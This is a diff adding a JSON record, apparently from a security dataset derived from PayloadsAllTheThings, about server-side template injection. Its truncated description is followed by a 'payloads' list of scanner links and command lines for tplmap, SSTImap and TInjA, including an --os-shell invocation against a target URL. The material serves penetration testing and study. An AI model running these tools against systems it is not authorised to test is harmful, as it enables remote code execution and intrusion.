@@ -1,0 +1,27 @@
+{
+  "id": "rce-17b93db12e05",
+  "category": "RCE",
+  "title": "README",
+  "description": "# Server Side Template Injection\n\n> Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages.\n\n## Summary\n\n- [Tools](#tools)\n- [Methodology](#methodology)\n    - [Detection and Exploitation Techniques](#detection-and-exploitation-techniques)\n        - [Rendered](#rendered)\n        - [Error",
+  "payloads": [
+    "- [Hackmanit/TInjA](https://github.com/Hackmanit/TInjA) - An efficient SSTI + CSTI scanner which utilizes novel polyglots",
+    "tinja url -u \"http://example.com/?name=Kirlia\" -H \"Authentication: Bearer ey...\"",
+    "tinja url -u \"http://example.com/\" -d \"username=Kirlia\"  -c \"PHPSESSID=ABC123...\"",
+    "- [epinna/tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool",
+    "python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell",
+    "python2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=*&comment=supercomment&link\"",
+    "python2.7 ./tplmap.py -u \"http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link\" --level 5 -e jade",
+    "- [vladko312/SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [epinna/tplmap](https://github.com/epinna/tplmap)",
+    "python3 ./sstimap.py -u 'https://example.com/page?name=John' -s",
+    "python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade",
+    "- Rendered, Time-Based: [Server-Side Template Injection: RCE For The Modern Web App - James Kettle - August 05, 2015](https://portswigger.net/knowledgebase/papers/serversidetemplateinjection.pdf)",
+    "- Polyglot-Based: [Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning - Maximilian Hildebrand - September 19, 2023](https://www.hackmanit.de/images/download/thesis/Improving-the-Detection-and-Identification-of-Template-Engines-for-Large-Scale-Template-Injection-Scanning-Maximilian-Hildebrand-Master-Thesis-Hackmanit.pdf)",
+    "- Error-Based, Boolean-Based: [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)",
+    "![Rendered technique workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/technique_Rendered.png?raw=true)",
+    "![Error-Based technique workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/technique_Error-Based.png?raw=true)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Server Side Template Injection/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
